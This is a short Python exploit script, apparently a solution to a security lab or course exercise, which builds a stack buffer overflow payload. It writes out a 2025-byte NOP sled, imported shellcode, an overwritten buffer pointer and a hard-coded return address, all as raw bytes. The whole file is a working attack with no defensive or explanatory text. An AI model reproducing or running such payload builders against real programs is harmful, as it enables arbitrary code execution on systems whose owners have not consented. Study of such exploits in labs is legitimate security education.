import sys
import struct
from shellcode import shellcode

#operate_buffer = 0xfffe69f8
r_address=0xfffe720c
nops = b'\x90'*2025
operate_buffer = 0xfffe719c
sys.stdout.buffer.write(struct.pack('2025s x',nops) + struct.pack('23s x',shellcode) + struct.pack('<I',operate_buffer)+struct.pack('<I',r_address))